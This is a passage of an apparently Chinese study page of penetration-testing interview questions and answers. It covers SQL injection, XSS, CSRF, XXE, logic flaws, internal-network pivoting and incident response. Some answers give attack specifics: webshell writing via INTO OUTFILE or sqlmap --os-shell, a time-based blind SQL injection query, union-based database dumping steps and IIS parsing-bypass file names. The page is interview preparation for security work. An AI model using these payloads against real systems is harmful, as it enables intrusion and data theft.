注入漏洞，对于这个变形注入，你有什么思路？<br>demo.do?DATA=AjAxNg==<br>DATA有可能经过了 base64 编码再传入服务器，所以我们也要对参数进行 base64 编码才能正确完成测试</p></li><li><p>34、发现 demo.jsp?uid=110 注入点，你有哪几种思路获取 webshell，哪种是优选？<br>有写入权限的，构造联合查询语句使用using INTO OUTFILE，可以将查询的输出重定向到系统的文件中，这样去写入 WebShell<br>使用 sqlmap –os-shell 原理和上面一种相同，来直接获得一个 Shell，这样效率更高<br>通过构造联合查询语句得到网站管理员的账户和密码，然后扫后台登录后台，再在后台通过改包上传等方法上传 Shell</p></li><li><p>35、CSRF 和 XSS 和 XXE 有什么区别，以及修复方式？<br>XSS是跨站脚本攻击，用户提交的数据中可以构造代码来执行，从而实现窃取用户信息等攻击。修复方式：对字符实体进行转义、使用HTTP Only来禁止JavaScript读取Cookie值、输入时校验、浏览器与Web应用端采用相同的字符编码。<br>CSRF是跨站请求伪造攻击，XSS是实现CSRF的诸多手段中的一种，是由于没有在关键操作执行时进行是否由用户自愿发起的确认。修复方式：筛选出需要防范CSRF的页面然后嵌入Token、再次输入密码、检验Referer<br>XXE是XML外部实体注入攻击，XML中可以通过调用实体来请求本地或者远程内容，和远程文件保护类似，会引发相关安全问题，例如敏感文件读取。修复方式：XML解析库在调用时严格禁止对外部实体的解析。</p></li><li><p>36、CSRF、SSRF和重放攻击有什么区别？<br>CSRF是跨站请求伪造攻击，由客户端发起<br>SSRF是服务器端请求伪造，由服务器发起<br>重放攻击是将截获的数据包进行重放，达到身份认证等目的</p></li><li><p>37、说出至少三种业务逻辑漏洞，以及修复方式？<br>密码找回漏洞中存在密码允许暴力破解、存在通用型找回凭证、可以跳过验证步骤、找回凭证可以拦包获取等方式来通过厂商提供的密码找回功能来得到密码<br>身份认证漏洞中最常见的是会话固定攻击和 Cookie 仿冒，只要得到 Session 或 Cookie 即可伪造用户身份<br>验证码漏洞中存在验证码允许暴力破解、验证码可以通过 Javascript 或者改包的方法来进行绕过</p></li><li><p>38、圈出下面会话中可能存在问题的项，并标注可能会存在的问题？<br>get /ecskins/demo.jsp?uid=2016031900&amp;keyword=”hello world”<br>HTTP/1.1Host:****.com:82User-Agent:Mozilla/</p></li></ul><p>5.0 Firefox/40Accept:text/css,<em>/</em>;q=0.1<br>Accept-Language:zh-CN;zh;q=0.8;en-US;q=0.5,en;q=0.3<br>Referer:http://****.com/eciop/orderForCC/<br>cgtListForCC.htm?zone=11370601&amp;v=145902<br>Cookie:myguid1234567890=1349db5fe50c372c3d995709f54c273d;<br>uniqueserid=session_OGRMIFIYJHAH5_HZRQOZAMHJ;<br>st_uid=N90PLYHLZGJXI-NX01VPUF46W;<br>status=True<br>Connection:keep-alive</p><ul><li><p>39、找一类你最擅长的漏洞，谈下绕过漏洞修复后的方案？</p></li><li><p>40、你常用的渗透工具有哪些，最常用的是哪个？</p></li><li><p>41、描述一个你深入研究过的 CVE 或 POC。</p></li><li><p>42、谈谈你经常关注的安全平台？</p></li><li><p>SQL的存储引擎</p></li><li><p>SQL注入写shell的条件，用法</p></li><li><p>GPC是什么？开启了怎么绕过</p></li><li><p>Mysql一个@和两个@什么区别</p></li><li><p>IIS解析漏洞，不同版本有什么漏洞，还有什么容器解析漏洞</p></li><li><p>wireshark抓包，数据报经过三层交换机、路由的变化，NAT协议描述，地址进入内网怎么变化</p></li><li><p>linux计划任务，黑客隐藏自己的计划任务会怎么做。windows计划任务怎么设定</p></li><li><p>三种主要的at batch cron，一般使用cron在规定的时间执行命令</p></li><li><p>挖过最难的漏洞是什么</p></li><li><p>ukelink</p></li><li><p>病毒和蠕虫的区别</p></li><li><p>DNS欺骗是什么</p></li></ul><p>定义： DNS欺骗就是攻击者冒充域名服务器的一种欺骗行为。 原理：如果可以冒充域名服务器，然后把查询的IP地址设为攻击者的IP地址，这样的话，用户上网就只能看到攻击者的主页，而不是用户想要取得的网站的主页了，这就是DNS欺骗的基本原理。DNS欺骗其实并不是真的“黑掉”了对方的网站，而是冒名顶替、招摇撞骗罢了。</p><ul><li><p>DDOS有哪些,CC攻击是什么,区别是什么,在哪一个层面,什么协议<br>陆地land攻击是什么</p></li><li><p>xss有什么？执行存储型的xss的危害和原理</p></li><li><p>渗透测试流程？（不够清晰，太浅显</p></li><li><p>有没有移动端的调试经验 apk,ipa包分析</p></li><li><p>对于云安全的理解</p></li><li><p>权限管理，内网威胁，信息泄露，过于依赖托管厂商</p></li><li><p>虚拟机逃逸的理解</p></li><li><p>虚拟机之间通信或上层主机的通信</p></li><li><p>英语介绍一下自己</p></li><li><p>职业路径</p></li><li><p>大学做过什么相关的事情</p></li><li><p>在工作会做什么来不断提高自己的能力</p></li><li><p>渗透测试流程</p></li><li><p>描述渗透项目，做了什么</p></li><li><p>xss漏洞类型、详情、修复方案</p></li><li><p>SQL注入原理、类型，waf绕过，写shell，提权，修复方案</p></li><li><p>终端的渗透经验</p></li><li><p>了解什么比较新的漏洞</p></li><li><p>企业内部安全</p></li><li><p>算法？了解过什么排序？</p></li><li><p>快速排序 冒泡排序</p></li><li><p>爬虫</p></li><li><p>页面存在很多js的时候，用什么<br>phnatomJS selenium execjs</p></li><li><p>爬虫的待爬取URL量级比较大的时候，如何对其去重<br>在数据库中创建字段的UNIQUE属性：对于在数据库中创建字段的UNIQUE属性， 的确是可以避免一些重复性操作。不过在多次MySQL报错之后，程序可能会直接崩溃，因此这种方式不可取<br>在数据库中创建一个唯一的索引，在插入数据之前检查待插入的数据是否存在：如果我们要在每一次插入数据之前都去检查待插入的数据是否存在，这样势必会影响程序的效率<br>使用Set或HashSet保存数据，确保唯一。可以使用redis，但是内存占用大<br>使用Map或是一个定长数组记录某一个URL是否被访问过<br>布隆过滤器(bloom filter)，bitmap</p></li><li><p>多线程 异步 协程 多路复用 用哪一个最快 为什么<br><a href="https://www.cnblogs.com/yuanchenqi/articles/6755717.html#_label3" target="_blank" rel="noopener">https://www.cnblogs.com/yuanchenqi/articles/6755717.html#_label3</a><br>线程也叫轻量级进程，它是一个基本的CPU执行单元，也是程序执行过程中的最小单元，由线程ID、程序计数器、寄存器集合和堆栈共同组成。线程的引入减小了程序并发执行时的开销，提高了操作系统的并发性能。线程没有自己的系统资源。<br>异步是指进程不需要一直等下去，而是继续执行下面的操作，不管其他进程的状态。当有消息返回时系统会通知进程进行处理，这样可以提高执行的效率。<br>协程是一种用户态的轻量级线程，拥有自己的寄存器上下文和栈</p></li><li><p>IO多路复用 异步阻塞IO 线程轮询IO</p></li><li><p>浏览器的常用编码<br>一开始我以为是说字符编码，有UTF8 Unicode GBK。面试官还几番提醒我也没答上来。回来一想，我觉得他应该问的是content-type。 <a href="http://www.runoob.com/http/http-content-type.html" target="_blank" rel="noopener">http://www.runoob.com/http/http-content-type.html</a></p></li><li><p>web常用的加密算法有什么<br>非对称加密 RSA、ElGamal、Rabin 对称加密 DES、3DES、AES 散列算法 MD5 SHA base64</p></li><li><p>有没有内网渗透的经验？怎么渗透？如果拿下了边界层的某一个机器，如何对内网其他进行探测？<br>拿下机器后 内网渗透使用代理访问内网 windows环境：reGeorg与proxifier Linux（kali-linux）环境：reGeorg与proxychains，使用nmap等工具进行扫描，发现web服务的主机和其它信息。有时这些边界机器上会记录一些内网服务器上的一些信息（用户 ssh known_hosts hosts 防火墙设置 记录、内网之间好多waf 规则基本都是空，大多数waf防外部威胁 这时候可以拿到探测的内部一些开放的端口判断进行渗透，通常用户这里基本是统一命名的 拿到的各种记录 会暴露出部分内网通讯的ip，内网内弱口令占大多数 FTP MSSQL 远程桌面链接</p></li><li><p>mysql中like查询会会非常缓慢，如何进行优化<br>分词索引</p></li><li><p>做了cdn的网站如何获取真实IP<br>多地ping看是否有cdn<br>邮件订阅或者rss订阅<br>二级域名可能不会做cdn<br>nslookup <a href="http://xxx.com" target="_blank" rel="noopener">http://xxx.com</a> 国外dns<br>查找域名历史解析记录，因为域名在上CDN之前用的IP，很有可能就是CDN的真实源IP地址 <a href="https://toolbar.netcraft.com/site_report?url=www.xxx.com" target="_blank" rel="noopener">https://toolbar.netcraft.com/site_report?url=www.xxx.com</a><br>phpinfo上显示的信息</p></li><li><p>渗透的时候如何隐藏自己的身份</p></li><li><p>主机疑似遭到入侵，要看哪里的日志</p></li><li><p>SQL注入漏洞怎么修复</p></li><li><p>安全研究的方面？做过哪些渗透测试的工作？</p></li><li><p>只给你一个网址，如何进行渗透测试</p></li><li><p>SQL注入，id=1如何检测？orderby怎么利用？limit语句怎么利用？盲注有什么？</p></li><li><p>sleep被禁用后还能怎么进行sql注入<br>BENCHMARK，Get_lock函数，当都被禁用后可以用计算量比较大的语句使数据库查询时间变长，从而达到延时注入的效果。 mysql：AND (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.SCHEMATA C);</p></li><li><p>XSS可以控制属性怎么利用</p></li><li><p>CSRF怎么防护？<br>尽量使用POST，限制GET；浏览器Cookie策略；加验证码； Referer Check；Anti CSRF Token</p></li><li><p>请求头中哪些是有危害的？</p></li><li><p>Cookie</p></li><li><p>XXE的危害？哪些地方容易存在xxe？xxe架构方面有没有了解过<br>xxe常见场景是如pdf在线解析、word在线解析、定制协议，留言板等，跟逻辑设计有关而与语言无关，最好是不要让XML作为参数传输或整体结构可被用户篡改。如果一定要使用，至少要禁用DTD、Entity。 xxe危害 读取本地文件，执行系统命令，探测内网端口，攻击内网服务 探测内网端口的协议有gopher file dict，不同语言支持不同的协议，是具体情况而定 file http ftp是常用的<br>防范，python用lxml时可以对resolve_entities设为false。或者过滤用户提交的xml<br>客户端也可以有xxe攻击，有的网站会使用office打开docx进行解析 Java解析XML的常用三方库，如果不禁用DTD、Entity都会导致XXE漏洞：<br>javax.xml.stream.XMLStreamReader;<br>javax.xml.parsers.DocumentBuilderFactory;</p></li><li><p>JAVA中间件的漏洞，举几个例子？<br>常见的是反序列化漏洞</p></li><li><p>IIS常见的漏洞<br>常见的为解析漏洞，6.0有 /test.asp/test.jpg test.asp;.jpg 7.5有test.jpg/.php，默认后缀IIS默认地还会解析其他后缀的文件为asp文件，比如cer asa cdx 原理大抵是IIS 5.x/6.0在从文件路径中读取文件后缀时，遇到一个“.”后，便进入了一种截断状态，在该状态下遇到特殊符号——“/”和“;”，都会进行截断，只保留特殊符号前的部分，即：“.asp”，从而认为文件后缀为“.asp”。</p></li><li><p>python有哪些框架，其中出现过哪些漏洞<br>flask的模板注入 模板注入和常见Web注入的成因一样，也是服务端接收了用户的输入，将其作为 Web 应用模板内容的一部分，在进行目标编译渲染的过程中，执行了用户插入的恶意内容，因而可能导致了敏感信息泄露、代码执行、GetShell 等问题。 模板字符串中字符串拼接或替换可能会导致敏感信息泄露，获取变量值 如果开发者在flask使用字符串格式化，来将用户输入动态地加入到模板字符串中，而不是通过render_template_string函数，该函数不会对输入进行实体转义将URL传递进入模板内容当中，会导致xss的产生。 还可以利用模板中html标签属性字段绕过xss过滤。</p></li></ul><p>Django出现过目录遍历漏洞</p><ul><li><p>业务逻辑漏洞，用户任意密码重置举出有什么例子，因为什么因素导致的？</p></li><li><p>PHP代码审计？开源的代码审计有没有做过？弱类型比较，反序列化漏洞这种考点在哪？</p></li><li><p>HTTP-Only禁止的是JS读取cookie信息，如何绕过这个获取cookie</p></li></ul><p>Http Trace攻击就可以将你的Header里的Cookie回显出来，利用Ajax或者flash就可以完成这种攻击；或者配置或者应用程序上可能Bypass，比如header头的泄漏</p><ul><li><p>有没有做过协议分析和抓包分析</p></li><li><p>mysql查看版本？</p></li><li><p>过安全狗</p></li><li><p>编程能力/平台逆向/修改程序入口/rootkit有没有研究过</p></li><li><p>说一个印象深刻的CTF的题目</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">- Padding Oracle-&gt;CBC-&gt;密码学(RSA&#x2F;AES&#x2F;DSA&#x2F;SM)</span><br><span class="line">- CRC32</span><br><span class="line">- 反序列化漏洞</span><br><span class="line">  ####</span><br></pre></td></tr></table></figure><ul><li><p>sql二次注入</p><p>第一次进行数据库插入数据的时候，仅仅只是使用了 <code>addslashes</code> 或者是借助 <code>get_magic_quotes_gpc</code> 对其中的特殊字符进行了转义，在写入数据库的时候还是保留了原来的数据，但是数据本身还是脏数据。 在将数据存入到了数据库中之后，开发者就认为数据是可信的。在下一次进行需要进行查询的时候，直接从数据库中取出了脏数据，没有进行进一步的检验和处理，这样就会造成SQL的二次注入。</p></li><li><p>交友网站，填写年龄处是一个注入点，页面会显示出与你相同年龄的用户有几个。使用and 1=1确定注入点，用order by探测列数，union select探测输出点是第几列</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. 暴库 &#96;group_concat(schema_name) from information_schema.schemata&#96;</span><br><span class="line">2. 暴表 &#96;group_concat(table_name) from information_schema.schemata where table_schema&#x3D;&#39;hhh&#39;&#96;</span><br><span class="line">3. 获取数据 &#96;concat(flag) from flag&#96;</span><br><span class="line">   修复：在从数据库或文件中取数据的时候，也要进行转义或者过滤。</span><br><span class="line">   ##</span><br></pre></td></tr></table></figure></li></ul><ul><li><p>爬虫模块、框架、反爬虫机制（IP-&gt;代理池、验证码破解、UA）</p></li><li><p>并发(多线程、线程池、协程、三个程之间的区别)</p><p>进程是cpu资源分配的最小单位，线程是cpu调度的最小单位。以前进程既是资源分配也是调度的最小单位，后来为了更合理的使用cpu(实际上是cpu性能越来越好)，才将资源分配和调度分开，就有了线程。线程是建立在进程的基础上的一次程序运行单位。</p><h3 id=""><a href="#" class="headerlink" title=""></a></h3></li><li><p>常用的标准库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">* </span><br><span class="line"></span><br><span class="line">- ## functools</span><br><span class="line"></span><br><span class="line">- itertools 迭代器</span><br><span class="line"></span><br><span class="line">  - count&#x2F;cycle&#x2F;repeat</span><br><span class="line">  - chain</span><br><span class="line">  - groupby 把迭代器中相邻的重复元素挑出来放在一起</span><br><span class="line"></span><br><span class="line">- concurrent.futures</span><br><span class="line"></span><br><span class="line">  - ThreadPoolExecutor</span><br><span class="line"></span><br><span class="line">- hashlib</span><br><span class="line"></span><br><span class="line">  - md5</span><br><span class="line">  - sha1</span><br><span class="line">  - sha256</span><br><span class="line">  - sha512</span><br><span class="line"></span><br><span class="line">- logging</span><br><span class="line"></span><br><span class="line">- sys.argv argparse读取命令行参数</span><br><span class="line"></span><br><span class="line">- pickle 序列化工具</span><br><span class="line"></span><br><span class="line">- re 正则</span><br><span class="line"></span><br><span class="line">- collections 多种数据类型</span><br><span class="line"></span><br><span class="line">  - namedtuple</span><br><span class="line">  - OrderedDict</span><br><span class="line">  - Counter</span><br><span class="line"></span><br><span class="line">- os 系统相关的函数</span><br></pre></td></tr></table></figure></li><li><p>DJANGO和FLASK区别和使用</p></li><li><p>RSA</p></li><li><p>DES</p></li><li><p>AES</p></li></ul><h3 id="-1"><a href="#-1" class="headerlink" title=""></a></h3><h3 id="国内SM系列"><a href="#国内SM系列" class="headerlink" title="国内SM系列"></a>国内SM系列</h3><h2 id="-2"><a href="#-2" class="headerlink" title=""></a></h2><h2 id="风险评估"><a href="#风险评估" class="headerlink" title="风险评估"></a>风险评估</h2><h3 id="-3"><a href="#-3" class="headerlink" title=""></a></h3><h3 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h3><p><a href="https://camo.githubusercontent.com/153eb16a3fe01bb0451e96d24abab56d22618b9b/68747470733a2f2f692e6c6f6c692e6e65742f323031382f30332f30392f356161323233646263383636322e6a7067" target="_blank" rel="noopener"><img src="/home/fkrvro/blog/source/picture/18/1" alt="img"></a></p><h3 id="-4"><a href="#-4" class="headerlink" title=""></a></h3><h3 id="三要素"><a href="#三要素" class="headerlink" title="三要素"></a>三要素</h3><ul><li>资产：资产价值</li><li>威胁：威胁主体、影响对象、出现频率、动机等</li><li>脆弱性：资产弱点的严重程度‘<h2 id="-5"><a href="#-5" class="headerlink" title=""></a></h2><h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><h3 id="-6"><a href="#-6" class="headerlink" title=""></a></h3><h3 id="Fority-SCA审计JAVA代码"><a href="#Fority-SCA审计JAVA代码" class="headerlink" title="Fority SCA审计JAVA代码"></a>Fority SCA审计JAVA代码</h3>fortify用到什么模块? 过滤器 自定义规则 生成报告<h3 id="-7"><a href="#-7" class="headerlink" title=""></a></h3><h3 id="Seay审计PHP代码"><a href="#Seay审计PHP代码" class="headerlink" title="Seay审计PHP代码"></a>Seay审计PHP代码</h3><h3 id="-8"><a href="#-8" class="headerlink" title=""></a></h3><h3 id="源码阅读"><a href="#源码阅读" class="headerlink" title="源码阅读"></a>源码阅读</h3><h2 id="-9"><a href="#-9" class="headerlink" title=""></a></h2><h2 id="应急响应具体流程"><a href="#应急响应具体流程" class="headerlink" title="应急响应具体流程"></a>应急响应具体流程</h2><h3 id="-10"><a href="#-10" class="headerlink" title=""></a></h3><h3 id="模型"><a href="#模型" class="headerlink" title="模型"></a>模型</h3><blockquote><p><a href="https://zhuanlan.zhihu.com/p/26542790" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/26542790</a><br>PDCERF模型</p></blockquote></li><li>Prepare（准备）：准备用来检测的工具和人</li><li>Detection（检测）：紧急事件监测：包括防火墙、系统、web服务器、IDS/WAF/SIEM中的日志，不正常或者是执行了越权操作的用户，甚至还有管理员的报告</li><li>Containment（抑制）：首先先控制受害范围，不要让攻击的影响继续蔓延到其他的IT资产和业务环境，切记不要直接一股脑的投入全部精力到封堵后门。紧接着要做的是去寻找根源原因，彻底解决，封堵攻击源，把业务恢复到更张水平</li><li>Eradication（根除）</li><li>Recover（恢复）</li><li>Follow-Up（跟踪）：根据各种监控去确定没有其他的攻击行为和攻击向量，紧接着就是开会反省此次事件，写报告，持续改进工作流程和工作缓解<h3 id="-11"><a href="#-11" class="headerlink" title=""></a></h3><h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><h4 id="-12"><a href="#-12" class="headerlink" title=""></a></h4><h4 id="DDOS"><a href="#DDOS" class="headerlink" title="DDOS"></a>DDOS</h4><h5 id="-13"><a href="#-13" class="headerlink" title=""></a></h5><h5 id="DDOS是什么"><a href="#DDOS是什么" class="headerlink" title="DDOS是什么"></a>DDOS是什么</h5>分布式拒绝服务攻击（DDoS）是目前黑客经常采用而难以防范的攻击手段。DoS的攻击方式有很多种，最基本的DoS攻击就是利用合理的服务请求来占用过多的服务资源，从而使合法用户无法得到服务的响应。<br>DDOS攻击手段是在传统的DOS攻击基础之上产生的一类攻击方式。单一的DOS攻击一般是采用一对一方式的，当攻击目标CPU速度低、内存小或者网络带宽小等等各项性能指标不高它的效果是明显的。随着计算机与网络技术的发展，计算机的处理能力迅速增长，内存大大增加，同时也出现了千兆级别的网络，这使得DOS攻击的困难程度加大了——目标对恶意攻击包的“消化能力”加强了不少，例如你的攻击软件每秒钟可以发送3,000个攻击包，但我的主机与网络带宽每秒钟可以处理10,000个攻击包，这样一来攻击就不会产生什么效果这时侯分布式的拒绝服务攻击手段（DDOS）就应运而生了。<br>如果说计算机与网络的处理能力加大了10倍，用一台攻击机来攻击不再能起作用的话，攻击者使用10台攻击机同时攻击呢？用100台呢？DDOS就是利用更多的傀儡机来发起进攻，以比从前更大的规模来进攻受害者。通常，被攻击的服务器有以下症状：1、被攻击主机上有大量等待的TCP连接；2、网络中充斥着大量的无用的数据包，源地址为假；3、制造高流量无用数据，造成网络拥塞，使受害主机无法正常和外界通讯；4、利用受害主机提供的服务或传输协议上的缺陷，反复高速的发出特定的服务请求，使受害主机无法及时处理所有正常请求；5、严重时会造成系统死机<h4 id="-14"><a href="#-14" class="headerlink" title=""></a></h4><h4 id="实例-1"><a href="#实例-1" class="headerlink" title="实例"></a>实例</h4>我司网站<a href="http://www.catroot.cn的IP" target="_blank" rel="noopener">www.catroot.cn的IP</a>  223.223.223.223 被人DDOS攻击，流量达9G，并且机房流量清洗无效，所以把223.223.223.223封停，导致网站不能访问，请作出紧急预案。<blockquote><p><a href="https://www.zhihu.com/question/19581905" target="_blank" rel="noopener">https://www.zhihu.com/question/19581905</a></p></blockquote></li><li>网络设备设施<ul><li>拼带宽，加大带宽，但是成本太高</li><li>使用硬件防火墙</li><li>选用高性能设备</li></ul></li><li>抗D思想和方案<ul><li>负载均衡</li><li>花钱买流量清洗服务</li><li>CDN：web层，比如cc攻击</li><li>分布式集群防御</li><li>高防：防大部分攻击，udp、大型的cc攻击</li></ul></li><li>预防为主<ul><li>系统漏洞</li><li>系统资源优化：</li><li>过滤不必要的服务和端口</li><li>限制特定流量：检查访问来源做适当限制<h4 id="-15"><a href="#-15" class="headerlink" title=""></a></h4><h4 id="主机被入侵"><a href="#主机被入侵" class="headerlink" title="主机被入侵"></a>主机被入侵</h4></li></ul></li></ul><ol><li>优先提取易消失的数据<ul><li>内存信息 <code>free -m</code> `htop</li><li>系统进程 <code>ps top netstat ss</code></li><li>路由信息 <code>tracert</code></li></ul></li><li><code>ifconfig</code>查看网卡流量，检查网卡的发送、接收数据情况</li><li><code>NetHogs</code>实时监控带宽占用状况</li><li>查看Linux系统日志 <code>/var/log</code></li><li><code>ClamAV</code>杀毒软件<h2 id="-16"><a href="#-16" class="headerlink" title=""></a></h2><h2 id="渗透测试流程相关"><a href="#渗透测试流程相关" class="headerlink" title="渗透测试流程相关"></a>渗透测试流程相关</h2><h3 id="-17"><a href="#-17" class="headerlink" title=""></a></h3><h3 id="渗透测试流程"><a href="#渗透测试流程" class="headerlink" title="渗透测试流程"></a>渗透测试流程</h3></li><li>项目访谈</li><li>信息收集：whois、网站源IP、旁站、C段网站、服务器系统版本、容器版本、程序版本、数据库类型、二级域名、防火墙、维护者信息</li><li>漏洞扫描：Nessus, AWVS</li><li>手动挖掘：逻辑漏洞</li><li>验证漏洞</li><li>修复建议</li><li>（如果有）基线检查/复验漏洞</li><li>输出报告<ul><li>概述</li><li>测试基本信息<ul><li>测试范围</li><li>测试时间</li><li>测试任务</li><li>测试过程</li></ul></li><li>信息安全风险综合分析<ul><li>整体风险分析</li><li>风险影响分析</li><li>系统安全分析</li><li>安全漏洞列表</li></ul></li><li>解决方案建议</li><li>复测报告<h3 id="-18"><a href="#-18" class="headerlink" title=""></a></h3><h3 id="渗透测试项目"><a href="#渗透测试项目" class="headerlink" title="渗透测试项目"></a>渗透测试项目</h3>用七八句话概括一下发现、验证漏洞细节、扮演角色、具体工作。 如果技术人员有兴趣会继续问，接着再引导到别处，让自己多说说细节。<h3 id="-19"><a href="#-19" class="headerlink" title=""></a></h3><h3 id="渗透测试具体实施"><a href="#渗透测试具体实施" class="headerlink" title="渗透测试具体实施"></a>渗透测试具体实施</h3><h3 id="-20"><a href="#-20" class="headerlink" title=""></a></h3><h3 id="17年OWASP-TOP10"><a href="#17年OWASP-TOP10" class="headerlink" title="17年OWASP TOP10"></a>17年OWASP TOP10</h3></li></ul></li></ol><ul><li>注入:sql,nosql,ldap,os</li><li>失效的身份认证:</li><li>敏感信息泄漏</li><li>XXE XML外部实体</li><li>失效的访问控制：管理页面仅能管理员权限访问；越权漏洞</li><li>安全配置错误：页面错误信息，默认密码，使用已知漏洞的应用</li><li>XSS</li><li>不安全的反序列化：一个PHP论坛使用PHP对象序列化来保存一个cookie，用户修改cookie即可伪造管理员登陆</li><li>使用含有已知漏洞的组件：比如structs2框架</li><li>不足的日志记录和监控：代码被删除，无法溯源；记录登陆失败次数；监控问题没被管理员响应<h3 id="-21"><a href="#-21" class="headerlink" title=""></a></h3><h3 id="常见的Web安全漏洞"><a href="#常见的Web安全漏洞" class="headerlink" title="常见的Web安全漏洞"></a>常见的Web安全漏洞</h3></li><li>SQL注入</li><li>XSS</li><li>文件遍历、文件上传、文件下载</li><li>垂直越权、水平越权</li><li>逻辑漏洞<h3 id="-22"><a href="#-22" class="headerlink" title=""></a></h3><h3 id="挖过什么逻辑漏洞"><a href="#挖过什么逻辑漏洞" class="headerlink" title="挖过什么逻辑漏洞"></a>挖过什么逻辑漏洞</h3><h4 id="-23"><a href="#-23" class="headerlink" title=""></a></h4><h4 id="订单任意金额修改"><a href="#订单任意金额修改" class="headerlink" title="订单任意金额修改"></a>订单任意金额修改</h4>相同价格增加订单数量，相同订单数量减少产品价格，订单价格设定为负数。<br>预防思路：</li><li>订单需要多重效验 <a href="https://camo.githubusercontent.com/00f94841c3917cc1a2bb6893377bfdb1d7c31b5a/687474703a2f2f696d6167652e333030312e6e65742f696d616765732f32303136303831392f31343731353933323536363535382e706e67" target="_blank" rel="noopener"><img src="https://camo.githubusercontent.com/00f94841c3917cc1a2bb6893377bfdb1d7c31b5a/687474703a2f2f696d6167652e333030312e6e65742f696d616765732f32303136303831392f31343731353933323536363535382e706e67" alt="img"></a></li><li>订单数值较大的时候需要人工审核<h4 id="-24"><a href="#-24" class="headerlink" title=""></a></h4><h4 id="验证码回传"><a href="#验证码回传" class="headerlink" title="验证码回传"></a>验证码回传</h4>漏洞一般发生在账号密码找回、账号注册、支付订单等。验证码发送途径一般为手机短信、邮箱邮件<br>预防思路：</li><li>response数据内不包含验证码，验证方式主要采取后端验证，但是缺点是服务器的运算压力也会随之增加</li><li>如果要进行前端验证的话也可以，但是需要进行加密<h4 id="-25"><a href="#-25" class="headerlink" title=""></a></h4><h4 id="未进行登陆凭证验证"><a href="#未进行登陆凭证验证" class="headerlink" title="未进行登陆凭证验证"></a>未进行登陆凭证验证</h4>有些业务的接口，因为缺少了对用户的登陆凭证的效验或者是验证存在缺陷，导致黑客可以未经授权访问这些敏感信息甚至是越权操作。比如后台页面、订单ID枚举、敏感信息可下载、没验证ID或cookie验证导致越权。<br>预防思路：</li><li>对敏感数据存在的接口和页面做cookie，ssid，token或者其它验证<h4 id="-26"><a href="#-26" class="headerlink" title=""></a></h4><h4 id="接口无限制枚举"><a href="#接口无限制枚举" class="headerlink" title="接口无限制枚举"></a>接口无限制枚举</h4></li><li>某电商登陆接口无验证导致撞库</li><li>某招聘网验证码无限制枚举</li><li>某快递公司优惠券枚举</li><li>某电商会员卡卡号枚举<br>预防思路：</li><li>在输入接口设置验证，如token，验证码等。如果设定验证码，最好不要单纯的采取一个前端验证，最好选择后端验证。如果设定token，请确保每个token只能采用一次，并且对token设定时间参数。</li><li>注册界面的接口不要返回太多敏感信息，以防遭到黑客制作枚举字典。</li><li>验证码不要用短数字，尽量6位以上，最好是以字母加数字进行组合，并且验证码需要设定时间期限。</li><li>优惠券，VIP卡号请尽量不要存在规律性和简短性，并且优惠券最好是以数字加字母进行组合。<h4 id="-27"><a href="#-27" class="headerlink" title=""></a></h4><h4 id="cookie设置存在缺陷"><a href="#cookie设置存在缺陷" class="headerlink" title="cookie设置存在缺陷"></a>cookie设置存在缺陷</h4></li><li>Cookie的效验值过于简单。有些web对于cookie的生成过于单一或者简单，导致黑客可以对cookie的效验值进行一个枚举.</li><li>cookie存在被盗风险，即用户重置密码后使用老cookie依然可以通过验证</li><li>用户的cookie数据加密应严格使用标准加密算法，并注意密钥管理。不能采取简单的base64等算法</li><li>越权：平行越权：权限类型不变，权限ID改变；垂直越权：权限ID不变，权限类型改变；交叉越权：即改变ID，也改变权限<br>预防思路</li></ul><ol><li>cookie中设定多个验证，比如自如APP的cookie中，需要sign和ssid两个参数配对，才能返回数据。</li><li>用户的cookie数据加密应严格使用标准加密算法，并注意密钥管理。</li><li>用户的cookie的生成过程中最好带入用户的密码，一旦密码改变，cookie的值也会改变。</li><li>cookie中设定session参数，以防cookie可以长时间生效。</li><li>根据业务不同还有很多方法<h3 id="-28"><a href="#-28" class="headerlink" title=""></a></h3><h3 id="找回密码功能缺陷"><a href="#找回密码功能缺陷" class="headerlink" title="找回密码功能缺陷"></a>找回密码功能缺陷</h3></li><li>单纯读取内存值作为用户凭证</li><li>电商系统加车、下单漏洞<h3 id="-29"><a href="#-29" class="headerlink" title=""></a></h3><h3 id="你常用的渗透工具有哪些，最常用的是哪个？"><a href="#你常用的渗透工具有哪些，最常用的是哪个？" class="headerlink" title="你常用的渗透工具有哪些，最常用的是哪个？"></a>你常用的渗透工具有哪些，最常用的是哪个？</h3><h4 id="-30"><a href="#-30" class="headerlink" title=""></a></h4><h4 id="扫描-Nessus-AWVS-Nikto"><a href="#扫描-Nessus-AWVS-Nikto" class="headerlink" title="扫描:Nessus,AWVS,Nikto"></a>扫描:Nessus,AWVS,Nikto</h4><h4 id="-31"><a href="#-31" class="headerlink" title=""></a></h4><h4 id="SQLmap"><a href="#SQLmap" class="headerlink" title="SQLmap"></a>SQLmap</h4><blockquote><p><a href="https://blog.csdn.net/ski_12/article/details/58188331" target="_blank" 